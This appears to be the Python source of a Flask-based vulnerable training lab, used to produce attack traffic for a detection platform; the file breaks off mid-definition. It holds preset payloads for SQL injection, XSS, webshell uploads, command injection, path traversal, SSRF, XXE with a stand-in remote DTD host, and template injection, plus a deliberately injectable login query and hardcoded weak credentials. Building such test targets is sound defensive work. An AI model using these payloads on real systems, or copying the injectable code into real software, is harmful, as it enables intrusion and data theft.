import argparse
import ipaddress
import os
from html import escape
import json
import sqlite3
import time
from pathlib import Path
from typing import Any, Dict, Set
from urllib.parse import unquote

from flask import Flask, jsonify, make_response, request

import pymysql
from pymysql.cursors import DictCursor


PROJECT_ROOT = Path(__file__).resolve().parents[1]
DB_PATH = PROJECT_ROOT / "output" / "target_lab" / "target_multivuln_lab.db"
BLOCK_CACHE_TTL_SECONDS = 2.0

MYSQL_CONF: Dict[str, Any] = {
    "host": "127.0.0.1",
    "port": 3306,
    "user": "root",
    "password": "123456",
    "database": "traffic_pipeline",
}
_BLOCK_CACHE: Dict[str, Any] = {"ts": 0.0, "ips": set()}
_WARNED_DB_ERR = False


def get_conn() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def get_mysql_conn():
    return pymysql.connect(
        host=MYSQL_CONF["host"],
        port=int(MYSQL_CONF["port"]),
        user=MYSQL_CONF["user"],
        password=MYSQL_CONF["password"],
        database=MYSQL_CONF["database"],
        charset="utf8mb4",
        cursorclass=DictCursor,
        autocommit=True,
        connect_timeout=2,
        read_timeout=2,
        write_timeout=2,
    )


def normalize_ip(value: Any) -> str:
    text = str(value or "").strip()
    if not text:
        return ""
    try:
        return str(ipaddress.ip_address(text))
    except Exception:
        return ""


def read_client_ip() -> str:
    xff = str(request.headers.get("X-Forwarded-For", "")).strip()
    if xff:
        first = xff.split(",", 1)[0].strip()
        ip = normalize_ip(first)
        if ip:
            return ip
    real_ip = str(request.headers.get("X-Real-IP", "")).strip()
    ip = normalize_ip(real_ip)
    if ip:
        return ip
    return normalize_ip(request.remote_addr)


def refresh_blocked_ips() -> Set[str]:
    global _WARNED_DB_ERR
    ips: Set[str] = set()
    try:
        with get_mysql_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT ip_address FROM demo_blocked_ips")
                rows = cur.fetchall() or []
        for row in rows:
            ip_text = normalize_ip(row.get("ip_address"))
            if ip_text:
                ips.add(ip_text)
        _WARNED_DB_ERR = False
    except Exception as exc:
        if not _WARNED_DB_ERR:
            print(f"[target-multivuln-lab] warn: cannot load blocked ip list from mysql: {exc}", flush=True)
            _WARNED_DB_ERR = True
    return ips


def is_client_ip_blocked(ip_text: str) -> bool:
    if not ip_text:
        return False
    now_ts = time.time()
    last_ts = float(_BLOCK_CACHE.get("ts") or 0.0)
    if now_ts - last_ts >= BLOCK_CACHE_TTL_SECONDS:
        _BLOCK_CACHE["ips"] = refresh_blocked_ips()
        _BLOCK_CACHE["ts"] = now_ts
    return ip_text in (_BLOCK_CACHE.get("ips") or set())


def init_db() -> None:
    with get_conn() as conn:
        cur = conn.cursor()
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS users (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              username TEXT NOT NULL UNIQUE,
              password TEXT NOT NULL,
              role TEXT NOT NULL DEFAULT 'user'
            )
            """
        )
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS comments (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              author TEXT NOT NULL,
              content TEXT NOT NULL,
              created_at REAL NOT NULL
            )
            """
        )
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS orders (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER NOT NULL,
              sku TEXT NOT NULL,
              amount INTEGER NOT NULL,
              created_at REAL NOT NULL
            )
            """
        )
        seed_users = [
            ("admin", "admin", "admin"),
            ("alice", "alice123", "user"),
            ("bob", "bob123", "user"),
            ("guest", "guest", "user"),
        ]
        for username, password, role in seed_users:
            cur.execute(
                """
                INSERT INTO users(username, password, role)
                VALUES (?, ?, ?)
                ON CONFLICT(username) DO UPDATE SET
                  password=excluded.password,
                  role=excluded.role
                """,
                (username, password, role),
            )
        conn.commit()


def has_any(text: str, patterns: list[str]) -> bool:
    low = (text or "").lower()
    return any(p.lower() in low for p in patterns)


app = Flask(__name__)


@app.before_request
def deny_blocked_clients():
    client_ip = read_client_ip()
    if client_ip and is_client_ip_blocked(client_ip):
        return (
            jsonify(
                {
                    "ok": False,
                    "error": "ip_blocked",
                    "message": "该IP已被防护系统封禁，访问被拒绝",
                    "client_ip": client_ip,
                }
            ),
            403,
        )


MOCK_FILES: Dict[str, str] = {
    "notes/todo.txt": "deploy patch; rotate token; review logs",
    "public/readme.txt": "welcome to multivuln test lab",
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:/var/www:/usr/sbin/nologin",
    "c:/windows/win.ini": "[fonts]\n[extensions]\n[MCI Extensions]",
}


LAB_PAGES: Dict[str, Dict[str, Any]] = {
    "sql": {
        "title": "SQL 注入测试",
        "tag": "认证绕过 / 报错注入 / 延时注入",
        "desc": "向登录接口发送典型 SQL 注入 payload，用于验证抓包、特征提取、模型检测和 LLM 分析链路。",
        "endpoint": "/api/auth/login",
        "presets": [
            {
                "name": "万能密码绕过",
                "method": "POST",
                "url": "/api/auth/login",
                "contentType": "application/json",
                "body": {"username": "admin", "password": "' or 1=1 -- "},
            },
            {
                "name": "UNION SELECT",
                "method": "POST",
                "url": "/api/auth/login",
                "contentType": "application/json",
                "body": {"username": "admin", "password": "admin' UNION SELECT id,username,role FROM users--"},
            },
            {
                "name": "延时注入",
                "method": "POST",
                "url": "/api/auth/login",
                "contentType": "application/json",
                "body": {"username": "admin", "password": "1' AND sleep(3)--"},
            },
        ],
    },
    "xss": {
        "title": "XSS 测试",
        "tag": "反射型 / 事件触发 / 编码绕过",
        "desc": "向搜索和评论接口发送脚本标签、事件处理器和 JavaScript 协议，验证 XSS 语义 payload 是否能被检测。",
        "endpoint": "/api/search",
        "presets": [
            {"name": "script 标签", "method": "GET", "url": "/api/search?q=<script>alert(1)</script>", "contentType": "", "body": None},
            {"name": "img onerror", "method": "GET", "url": "/api/search?q=<img src=x onerror=alert(1)>", "contentType": "", "body": None},
            {
                "name": "评论存储型 XSS",
                "method": "POST",
                "url": "/api/comment",
                "contentType": "application/json",
                "body": {"author": "tester", "content": "<svg onload=alert(document.cookie)>"},
            },
        ],
    },
    "upload": {
        "title": "文件上传测试",
        "tag": "WebShell / 危险后缀 / 脚本内容",
        "desc": "模拟上传 PHP/JSP/ASPX 等危险文件名或脚本内容，用于测试文件上传攻击识别。",
        "endpoint": "/api/upload",
        "presets": [
            {"name": "PHP WebShell", "method": "POST", "url": "/api/upload", "contentType": "application/json", "body": {"filename": "shell.php", "content": "<?php system($_GET['cmd']); ?>"}},
            {"name": "JSP WebShell", "method": "POST", "url": "/api/upload", "contentType": "application/json", "body": {"filename": "cmd.jsp", "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"}},
            {"name": "正常图片", "method": "POST", "url": "/api/upload", "contentType": "application/json", "body": {"filename": "avatar.png", "content": "PNG_IMAGE_BYTES"}},
        ],
    },
    "command": {
        "title": "命令注入测试",
        "tag": "shell 分隔符 / 系统命令",
        "desc": "向 ping 接口发送 ;、&&、| 等命令拼接 payload，模拟命令执行攻击。",
        "endpoint": "/api/system/ping",
        "presets": [
            {"name": "Linux whoami", "method": "POST", "url": "/api/system/ping", "contentType": "application/json", "body": {"host": "127.0.0.1; whoami"}},
            {"name": "读取 passwd", "method": "POST", "url": "/api/system/ping", "contentType": "application/json", "body": {"host": "127.0.0.1 && cat /etc/passwd"}},
            {"name": "PowerShell", "method": "POST", "url": "/api/system/ping", "contentType": "application/json", "body": {"host": "localhost | powershell whoami"}},
        ],
    },
    "traversal": {
        "title": "路径遍历测试",
        "tag": "../ / 敏感文件读取",
        "desc": "访问文件读取接口，使用目录回退读取 Linux/Windows 敏感文件。",
        "endpoint": "/api/file/read",
        "presets": [
            {"name": "读取 /etc/passwd", "method": "GET", "url": "/api/file/read?path=../../../../etc/passwd", "contentType": "", "body": None},
            {"name": "读取 win.ini", "method": "GET", "url": "/api/file/read?path=..\\..\\..\\windows\\win.ini", "contentType": "", "body": None},
            {"name": "正常文件", "method": "GET", "url": "/api/file/read?path=public/readme.txt", "contentType": "", "body": None},
        ],
    },
    "ssrf": {
        "title": "SSRF 测试",
        "tag": "内网探测 / 元数据读取 / file 协议",
        "desc": "向服务端 fetch 接口提交内网地址、云元数据地址或 file 协议，模拟 SSRF。",
        "endpoint": "/api/fetch",
        "presets": [
            {"name": "云元数据", "method": "GET", "url": "/api/fetch?url=http://169.254.169.254/latest/meta-data/", "contentType": "", "body": None},
            {"name": "本机管理端", "method": "GET", "url": "/api/fetch?url=http://127.0.0.1:8080/admin", "contentType": "", "body": None},
            {"name": "正常外站", "method": "GET", "url": "/api/fetch?url=https://example.com/", "contentType": "", "body": None},
        ],
    },
    "xxe": {
        "title": "XXE 测试",
        "tag": "外部实体 / 本地文件泄露",
        "desc": "向 XML 导入接口发送 DOCTYPE 和 ENTITY，模拟 XML 外部实体攻击。",
        "endpoint": "/api/xml/import",
        "presets": [
            {"name": "读取本地文件", "method": "POST", "url": "/api/xml/import", "contentType": "application/xml", "body": "<?xml version='1.0'?><!DOCTYPE a [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><a>&xxe;</a>"},
            {"name": "远程 DTD", "method": "POST", "url": "/api/xml/import", "contentType": "application/xml", "body": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.test/xxe.dtd'>%xxe;]>"},
            {"name": "正常 XML", "method": "POST", "url": "/api/xml/import", "contentType": "application/xml", "body": "<note><title>hello</title><body>normal</body></note>"},
        ],
    },
    "ssti": {
        "title": "模板注入测试",
        "tag": "SSTI / Jinja2 / 表达式执行",
        "desc": "向模板渲染接口提交 Jinja/EL 表达式，模拟服务端模板注入。",
        "endpoint": "/api/template/render",
        "presets": [
            {"name": "Jinja config", "method": "POST", "url": "/api/template/render", "contentType": "application/json", "body": {"template": "{{config.__class__.__init__.__globals__}}"}},
            {"name": "Jinja subclasses", "method": "POST", "url": "/api/template/render", "contentType": "application/json", "body": {"template": "{{''.__class__.__mro__[1].__subclasses__()}}"}},
            {"name": "正常模板", "method": "POST", "url": "/api/template/render", "contentType": "application/json", "body": {"template": "hello ${name}"}},
        ],
    },
    "deserialize": {
        "title": "反序列化测试",
        "tag": "Java / PHP / gadget",
        "desc": "提交可疑序列化对象，模拟 Java/PHP 反序列化攻击流量。",
        "endpoint": "/api/deserialize",
        "presets": [
            {"name": "Java Base64", "method": "POST", "url": "/api/deserialize", "contentType": "application/json", "body": {"data": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA=="}},
            {"name": "PHP Object", "method": "POST", "url": "/api/deserialize", "contentType": "application/json", "body": {"data": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"pwn\";}"}},
            {"name": "正常 JSON", "method": "POST", "url": "/api/deserialize", "contentType": "application/json", "body": {"data": "{\"safe\":true}"}},
        ],
    },
    "graphql": {
        "title": "GraphQL 测试",
        "tag": "Schema 枚举 / 越权查询 / 注入",
        "desc": "发送 introspection、mutation 和异常查询，模拟 GraphQL 攻击行为。",
        "endpoint": "/api/graphql",
        "presets": [
            {"name": "Schema 枚举", "method": "POST", "url": "/api/graphql", "contentType": "application/json", "body": {"query": "{__schema{types{name fields{name}}}}"}},
            {"name": "越权 mutation", "method": "POST", "url": "/api/graphql", "contentType": "application/json", "body": {"query": "mutation { resetPassword(userId:1,password:\"pwned\") }"}},
            {"name": "正常查询", "method": "POST", "url": "/api/graphql", "contentType": "application/json", "body": {"query": "{ viewer { id username displayName } }"}},
        ],
    },
    "bruteforce": {
        "title": "暴力破解测试",
        "tag": "弱口令 / 高频登录失败",
        "desc": "模拟常见弱口令登录尝试。可以连续点击发送，观察抓包批次和告警刷新。",
        "endpoint": "/api/auth/login",
        "presets": [
            {"name": "admin/123456", "method": "POST", "url": "/api/auth/login", "contentType": "application/json", "body": {"username": "admin", "password": "123456"}},
            {"name": "root/password", "method": "POST", "url": "/api/auth/login", "contentType": "application/json", "body": {"username": "root", "password": "password"}},
            {"name": "正常登录", "method": "POST", "url": "/api/auth/login", "contentType": "application/json", "body": {"username": "admin", "password": "admin"}},
        ],
    },
}


def render_lab_page(kind: str = "home") -> str:
    page = LAB_PAGES.get(kind)
    is_home = page is None
    active = kind if not is_home else "home"
    nav_items = ['<a class="nav-item {cls}" href="/">总览</a>'.format(cls="active" if active == "home" else "")]
    for key, cfg in LAB_PAGES.items():
        cls = "active" if active == key else ""
        nav_items.append(f'<a class="nav-item {cls}" href="/{key}">{escape(cfg["title"])}</a>')

    if is_home:
        title = "综合漏洞测试靶场"
        tag = "SQL / XSS / 上传 / SSRF / 命令注入 / 更多"
        desc = "这是给 AI 攻击态势感知平台准备的多页面测试靶场。每个页面都能一键发送典型攻击请求，方便观察 input、result、大模型分析和数据库大屏刷新。"
        cards = "\n".join(
            f'<a class="lab-card" href="/{key}"><span>{escape(cfg["tag"])}</span><strong>{escape(cfg["title"])}</strong><p>{escape(cfg["desc"])}</p></a>'
            for key, cfg in LAB_PAGES.items()
        )
        main = f"""
          <section class="hero">
            <div>
              <span class="eyebrow">TARGET MULTI-VULN LAB</span>
              <h1>{escape(title)}</h1>
              <p>{escape(desc)}</p>
            </div>
            <div class="status-card">
              <b>服务状态</b>
              <span class="pulse"></span>
              <p>运行中 · 端口由启动脚本配置</p>
              <code>/health</code>
            </div>
          </section>
          <section class="grid">{cards}</section>
        """
        presets_json = "[]"
    else:
        title = str(page["title"])
        tag = str(page["tag"])
        desc = str(page["desc"])
        presets_json = json.dumps(page["presets"], ensure_ascii=False).replace("</", "<\\/")
        preset_buttons = "\n".join(
            f'<button class="preset" data-index="{idx}"><span>{idx + 1:02d}</span>{escape(str(item["name"]))}</button>'
            for idx, item in enumerate(page["presets"])
        )
        main = f"""
          <section class="hero compact">
            <div>
              <span class="eyebrow">{escape(tag)}</span>
              <h1>{escape(title)}</h1>
              <p>{escape(desc)}</p>
            </div>
            <div class="status-card">
              <b>目标接口</b>
              <code>{escape(str(page["endpoint"]))}</code>
            </div>
          </section>
          <section class="tester">
            <div class="panel">
              <h2>Payload 预设</h2>
              <div class="preset-list">{preset_buttons}</div>
              <div class="field-row">
                <label>Method<select id="method"><option>GET</option><option>POST</option></select></label>
                <label>URL<input id="url" /></label>
              </div>
              <label>Content-Type<input id="contentType" placeholder="application/json" /></label>
              <label>请求体<textarea id="body" spellcheck="false"></textarea></label>
              <div class="actions">
                <button id="send" class="primary">发送测试包</button>
                <button id="copy" class="secondary">复制 curl</button>
              </div>
            </div>
            <div class="panel result-panel">
              <h2>响应结果</h2>
              <div class="meta" id="meta">等待请求...</div>
              <pre id="result">选择一个预设，然后点击“发送测试包”。</pre>
            </div>
          </section>
        """

    return f"""<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>{escape(title)} · Traffic Lab</title>
  <style>
    :root {{
      --bg:#07111f; --panel:rgba(12,28,50,.78); --panel2:rgba(9,18,32,.9);
      --line:rgba(125,211,252,.22); --cyan:#22d3ee; --blue:#38bdf8;
      --text:#eaf6ff; --muted:#8fb4c8; --green:#2dd4bf; --orange:#fb923c;
      --danger:#fb7185; --shadow:0 24px 70px rgba(0,0,0,.42);
    }}
    *{{box-sizing:border-box}}
    body{{
      margin:0; min-height:100vh; color:var(--text);
      font-family:"Microsoft YaHei UI","Microsoft YaHei","Segoe UI",sans-serif;
      background:
        radial-gradient(circle at 16% 8%, rgba(34,211,238,.24), transparent 30%),
        radial-gradient(circle at 82% 10%, rgba(59,130,246,.20), transparent 28%),
        linear-gradient(135deg,#06101d 0%,#071828 44%,#030712 100%);
      overflow-x:hidden;
    }}
    body:before{{
      content:""; position:fixed; inset:0; pointer-events:none; opacity:.35;
      background-image:linear-gradient(rgba(125,211,252,.08) 1px,transparent 1px),linear-gradient(90deg,rgba(125,211,252,.08) 1px,transparent 1px);
      background-size:38px 38px;
      mask-image:linear-gradient(to bottom,#000,transparent 88%);
    }}
    .app{{display:grid; grid-template-columns:280px 1fr; min-height:100vh; position:relative; z-index:1}}
    aside{{border-right:1px solid var(--line); padding:28px 18px; background:rgba(2,6,23,.54); backdrop-filter:blur(18px)}}
    .brand{{display:flex;align-items:center;gap:12px;margin-bottom:28px}}
    .logo{{width:42px;height:42px;border-radius:14px;background:linear-gradient(135deg,var(--cyan),#2563eb);box-shadow:0 0 28px rgba(34,211,238,.5)}}
    .brand b{{display:block;font-size:18px;letter-spacing:.04em}} .brand small{{color:var(--muted)}}
    .nav-item{{display:block;text-decoration:none;color:#b7d4e4;padding:12px 14px;border-radius:14px;margin:5px 0;border:1px solid transparent;transition:.2s ease}}
    .nav-item:hover{{transform:translateX(4px);background:rgba(34,211,238,.10);border-color:var(--line);color:white}}
    .nav-item.active{{background:linear-gradient(135deg,rgba(34,211,238,.24),rgba(59,130,246,.16));border-color:rgba(34,211,238,.45);color:white;box-shadow:0 12px 30px rgba(34,211,238,.12)}}
    main{{padding:34px; max-width:1500px; width:100%; margin:0 auto}}
    .hero{{display:flex;justify-content:space-between;gap:24px;align-items:stretch;margin-bottom:24px;padding:28px;border:1px solid var(--line);border-radius:28px;background:linear-gradient(135deg,rgba(12,28,50,.80),rgba(8,16,28,.68));box-shadow:var(--shadow)}}
    .hero.compact{{padding:24px}}
    .eyebrow{{display:inline-flex;align-items:center;gap:8px;color:var(--cyan);font-weight:800;letter-spacing:.14em;font-size:12px;text-transform:uppercase}}
    .eyebrow:before{{content:"";width:8px;height:8px;border-radius:99px;background:var(--cyan);box-shadow:0 0 16px var(--cyan)}}
    h1{{font-size:clamp(34px,5vw,64px);line-height:1;margin:14px 0 14px;letter-spacing:-.05em}}
    .hero p{{max-width:780px;color:var(--muted);font-size:17px;line-height:1.8;margin:0}}
    .status-card{{min-width:240px;padding:20px;border-radius:22px;background:rgba(2,6,23,.58);border:1px solid var(--line);align-self:stretch;display:flex;flex-direction:column;justify-content:center;gap:10px}}
    .status-card b{{font-size:18px}} code{{color:#bff7ff;background:rgba(34,211,238,.10);border:1px solid rgba(34,211,238,.22);border-radius:10px;padding:5px 8px;word-break:break-all}}
    .pulse{{width:13px;height:13px;border-radius:50%;background:var(--green);box-shadow:0 0 0 8px rgba(45,212,191,.12),0 0 22px var(--green)}}
    .grid{{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:18px}}
    .lab-card{{min-height:188px;text-decoration:none;color:var(--text);padding:22px;border:1px solid var(--line);border-radius:24px;background:linear-gradient(145deg,rgba(12,28,50,.82),rgba(3,7,18,.72));box-shadow:0 18px 46px rgba(0,0,0,.28);transition:.22s ease;position:relative;overflow:hidden}}
    .lab-card:after{{content:"";position:absolute;inset:auto -20% -45% -20%;height:120px;background:radial-gradient(circle,rgba(34,211,238,.22),transparent 68%);transition:.22s ease}}
    .lab-card:hover{{transform:translateY(-6px) scale(1.01);border-color:rgba(34,211,238,.62);box-shadow:0 24px 70px rgba(34,211,238,.12)}}
    .lab-card span{{color:var(--cyan);font-size:12px;letter-spacing:.08em}} .lab-card strong{{display:block;font-size:24px;margin:16px 0 10px}} .lab-card p{{color:var(--muted);line-height:1.7;margin:0}}
    .tester{{display:grid;grid-template-columns:minmax(420px,1fr) minmax(420px,1fr);gap:20px}}
    .panel{{padding:22px;border:1px solid var(--line);border-radius:26px;background:var(--panel);box-shadow:var(--shadow)}}
    .panel h2{{margin:0 0 16px;font-size:22px}} .preset-list{{display:grid;gap:10px;margin-bottom:16px}}
    .preset{{text-align:left;border:1px solid rgba(125,211,252,.25);background:rgba(2,6,23,.52);color:var(--text);border-radius:16px;padding:12px 14px;cursor:pointer;transition:.18s ease;font-weight:700}}
    .preset span{{display:inline-flex;width:32px;color:var(--cyan)}} .preset:hover,.preset.active{{transform:translateX(5px);border-color:var(--cyan);background:rgba(34,211,238,.14)}}
    label{{display:block;color:#cde7f5;font-weight:700;margin:12px 0 7px}} .field-row{{display:grid;grid-template-columns:140px 1fr;gap:12px}}
    input,select,textarea{{width:100%;border:1px solid rgba(125,211,252,.26);background:rgba(2,6,23,.72);color:var(--text);border-radius:14px;padding:12px;font:14px Consolas,"Microsoft YaHei UI",monospace;outline:none}}
    textarea{{min-height:170px;resize:vertical}} input:focus,select:focus,textarea:focus{{border-color:var(--cyan);box-shadow:0 0 0 4px rgba(34,211,238,.10)}}
    .actions{{display:flex;gap:14px;margin-top:16px}} button.primary,button.secondary{{border:0;border-radius:16px;padding:13px 18px;font-weight:900;cursor:pointer;transition:.18s ease}}
    button.primary{{background:linear-gradient(135deg,#22d3ee,#2563eb);color:#02111f;box-shadow:0 16px 32px rgba(34,211,238,.22)}} button.secondary{{background:rgba(125,211,252,.12);color:var(--text);border:1px solid var(--line)}}
    button.primary:hover,button.secondary:hover{{transform:translateY(-2px);filter:brightness(1.08)}}
    .result-panel{{background:var(--panel2)}} .meta{{color:var(--muted);margin-bottom:12px;min-height:22px}}
    pre{{min-height:480px;max-height:680px;overflow:auto;white-space:pre-wrap;word-break:break-word;background:#020617;border:1px solid rgba(125,211,252,.2);border-radius:18px;padding:18px;color:#d8f8ff;line-height:1.6}}
    @media (max-width:1100px){{.app{{grid-template-columns:1fr}}aside{{position:relative}}.grid{{grid-template-columns:1fr}}.tester{{grid-template-columns:1fr}}.hero{{flex-direction:column}}}}
  </style>
</head>
<body>
  <div class="app">
    <aside>
      <div class="brand"><div class="logo"></div><div><b>Traffic Lab</b><small>经典漏洞测试靶场</small></div></div>
      {''.join(nav_items)}
    </aside>
    <main>{main}</main>
  </div>
  <script>
    const presets = {presets_json};
    const methodEl = document.getElementById("method");
    const urlEl = document.getElementById("url");
    const contentTypeEl = document.getElementById("contentType");
    const bodyEl = document.getElementById("body");
    const resultEl = document.getElementById("result");
    const metaEl = document.getElementById("meta");
    const presetButtons = [...document.querySelectorAll(".preset")];
    function stringifyBody(body) {{
      if (body === null || body === undefined) return "";
      if (typeof body === "string") return body;
      return JSON.stringify(body, null, 2);
    }}
    function loadPreset(index) {{
      const item = presets[index];
      if (!item) return;
      presetButtons.forEach(x => x.classList.remove("active"));
      if (presetButtons[index]) presetButtons[index].classList.add("active");
      methodEl.value = item.method || "GET";
      urlEl.value = item.url || "/";
      contentTypeEl.value = item.contentType || "";
      bodyEl.value = stringifyBody(item.body);
    }}
    presetButtons.forEach(btn => btn.addEventListener("click", () => loadPreset(Number(btn.dataset.index))));
    if (presets.length) loadPreset(0);
    async function sendRequest() {{
      const method = methodEl.value;
      const url = urlEl.value;
      const contentType = contentTypeEl.value.trim();
      const options = {{ method, headers: {{}} }};
      if (method !== "GET" && method !== "HEAD") {{
        if (contentType) options.headers["Content-Type"] = contentType;
        options.body = bodyEl.value;
      }}
      const started = performance.now();
      metaEl.textContent = "请求中...";
      resultEl.textContent = "";
      try {{
        const resp = await fetch(url, options);
        const text = await resp.text();
        const ms = Math.round(performance.now() - started);
        metaEl.textContent = `HTTP ${{resp.status}} · ${{ms}} ms · ${{method}} ${{url}}`;
        try {{
          resultEl.textContent = JSON.stringify(JSON.parse(text), null, 2);
        }} catch {{
          resultEl.textContent = text;
        }}
      }} catch (err) {{
        metaEl.textContent = "请求失败";
        resultEl.textContent = String(err);
      }}
    }}
    function copyCurl() {{
      const method = methodEl.value;
      const url = location.origin + urlEl.value;
      const contentType = contentTypeEl.value.trim();
      let cmd = `curl -X ${{method}} "${{url}}"`;
      if (contentType) cmd += ` -H "Content-Type: ${{contentType}}"`;
      if (method !== "GET" && bodyEl.value) cmd += ` --data '${{bodyEl.value.replaceAll("'", "'\\\\''")}}'`;
      navigator.clipboard?.writeText(cmd);
      metaEl.textContent = "curl 命令已复制";
    }}
    document.getElementById("send")?.addEventListener("click", sendRequest);
    document.getElementById("copy")?.addEventListener("click", copyCurl);
  </script>
</body>
</html>"""


@app.get("/health")
def health():
    return jsonify({"ok": True, "service": "target-multivuln-lab"})


@app.get("/")
def home():
    return render_lab_page("home")


@app.get("/<kind>")
def lab_page(kind: str):
    if kind in LAB_PAGES:
        return render_lab_page(kind)
    return jsonify({"ok": False, "error": "page_not_found", "path": kind}), 404


@app.get("/api/products")
def products():
    items = [
        {"id": 1001, "name": "WAF Appliance", "price": 2999},
        {"id": 1002, "name": "Threat Sensor", "price": 899},
        {"id": 1003, "name": "SIEM License", "price": 5999},
    ]
    return jsonify({"ok": True, "items": items})


@app.get("/api/news")
def news():
    return jsonify(
        {
            "ok": True,
            "items": [
                {"id": 1, "title": "platform update"},
                {"id": 2, "title": "new plugin released"},
            ],
        }
    )


@app.post("/api/auth/login")
def auth_login():
    body = request.get_json(silent=True) or {}
    username = str(body.get("username", ""))
    password = str(body.get("password", ""))
    vuln_sql = (
        "SELECT id, username, role FROM users "
        f"WHERE username = '{username}' AND password = '{password}' LIMIT 1"
    )
    if has_any(password, ["sleep(", "benchmark(", "waitfor delay"]):
        time.sleep(0.08)
    try:
        with get_conn() as conn:
            row = conn.execute(vuln_sql).fetchone()
    except Exception as exc:
        return jsonify({"ok": False, "error": "sql_error", "message": str(exc), "query": vuln_sql}), 500
    if row:
        return jsonify(
            {
                "ok": True,
                "message": "login success",
                "user": {"id": row["id"], "username": row["username"], "role": row["role"]},
            }
        )
    return jsonify({"ok": False, "message": "invalid username or password"}), 401


@app.get("/api/search")
def search():
    q = str(request.args.get("q", ""))
    if has_any(q, ["<script", "onerror=", "javascript:"]):
        return jsonify({"ok": True, "query": q, "hits": 1, "note": "reflected"}), 200
    return jsonify({"ok": True, "query": q, "hits": 3}), 200


@app.post("/api/comment")
def add_comment():
    body = request.get_json(silent=True) or {}
    author = str(body.get("author", "guest"))[:64]
    content = str(body.get("content", ""))[:4096]
    with get_conn() as conn:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO comments(author, content, created_at) VALUES (?, ?, ?)",
            (author, content, time.time()),
        )
        cid = int(cur.lastrowid)
        conn.commit()
    return jsonify({"ok": True, "comment_id": cid, "content": content})


@app.get("/api/file/read")
def file_read():
    path_text = str(request.args.get("path", "")).strip()
    decoded = unquote(path_text).lower()
    if has_any(decoded, ["../", "..\\", "/etc/passwd", "win.ini", "system32"]):
        if "win.ini" in decoded:
            return jsonify({"ok": True, "path": path_text, "content": MOCK_FILES["c:/windows/win.ini"]})
        return jsonify({"ok": True, "path": path_text, "content": MOCK_FILES["/etc/passwd"]})
    if path_text in MOCK_FILES:
        return jsonify({"ok": True, "path": path_text, "content": MOCK_FILES[path_text]})
    return jsonify({"ok": False, "error": "file_not_found"}), 404


@app.post("/api/system/ping")
def system_ping():
    body = request.get_json(silent=True) or {}
    host = str(body.get("host", "")).strip()
    if has_any(host, [";", "&&", "|", "`", "$(", "cat ", "whoami", "powershell"]):
        return jsonify(
            {
                "ok": True,
                "host": host,
                "output": "uid=0(root) gid=0(root) groups=0(root)",
                "exec": "shell",
            }
        )
    return jsonify({"ok": True, "host": host, "output": "pong", "latency_ms": 7})


@app.get("/api/fetch")
def fetch_url():
    url = str(request.args.get("url", "")).strip().lower()
    if has_any(url, ["169.254.169.254", "127.0.0.1", "localhost", "redis://", "file://"]):
        return jsonify(
            {
                "ok": True,
                "url": url,
                "data": "instance-id:i-abcd1234\niam-role:admin",
                "source": "internal",
            }
        )
    return jsonify({"ok": True, "url": url, "data": "public-content", "source": "external"})


@app.post("/api/template/render")
def template_render():
    body = request.get_json(silent=True) or {}
    tpl = str(body.get("template", ""))[:4096]
    if has_any(tpl, ["{{", "}}", "__class__", "config", "cycler"]):
        return jsonify({"ok": True, "rendered": "49", "engine": "jinja2"})
    return jsonify({"ok": True, "rendered": tpl.replace("${name}", "guest"), "engine": "safe"})


@app.post("/api/xml/import")
def xml_import():
    body_text = request.get_data(cache=False, as_text=True) or ""
    low = body_text.lower()
    if "<!entity" in low or "system " in low or "file://" in low:
        return jsonify({"ok": True, "items": 1, "leak": MOCK_FILES["/etc/passwd"]})
    return jsonify({"ok": True, "items": 2, "message": "xml parsed"})


@app.post("/api/deserialize")
def deserialize():
    body = request.get_json(silent=True) or {}
    payload = str(body.get("data", ""))[:8192]
    if has_any(payload, ["rO0AB", "pickle", "__reduce__", "java.lang.runtime"]):
        return jsonify({"ok": True, "result": "object loaded", "side_effect": "command executed"})
    return jsonify({"ok": True, "result": "object loaded"})


@app.post("/api/upload")
def upload():
    body = request.get_json(silent=True) or {}
    filename = str(body.get("filename", "unknown.bin")).strip()
    content = str(body.get("content", ""))[:12000]
    is_shell = has_any(filename, [".php", ".jsp", ".aspx", ".war"]) or has_any(
        content, ["<?php", "<%=", "jsp:scriptlet", "Runtime.getRuntime()"]
    )
    return jsonify({"ok": True, "stored": f"/uploads/{filename}", "risk": "shell" if is_shell else "low"}), 201


@app.post("/api/graphql")
def graphql():
    body = request.get_json(silent=True) or {}
    query = str(body.get("query", ""))
    if has_any(query, ["__schema", "union select", " or 1=1", "sleep("]):
        return jsonify({"ok": True, "data": {"debug": "enabled", "rows": [{"id": 1}, {"id": 2}]}})
    return jsonify({"ok": True, "data": {"viewer": {"id": 1001, "name": "guest"}}})


@app.route("/api/admin/reset", methods=["GET", "POST"])
def admin_reset():
    token = str(request.values.get("token", "")).strip()
    if has_any(token, ["none", "000000", "weak", "bypass", "admin"]):
        return jsonify({"ok": True, "changed": 3, "note": "token accepted"})
    return jsonify({"ok": False, "error": "unauthorized"}), 403


@app.route("/api/eval", methods=["GET", "POST"])
def eval_expr():
    code = str(request.values.get("code", "") or (request.get_json(silent=True) or {}).get("code", ""))
    if has_any(code, ["__import__", "os.system", "subprocess", "Runtime.getRuntime"]):
        return jsonify({"ok": True, "result": "uid=0(root)"})
    if code.strip() == "1+1":
        return jsonify({"ok": True, "result": 2})
    return jsonify({"ok": True, "result": "noop"})


@app.get("/api/orders")
def list_orders():
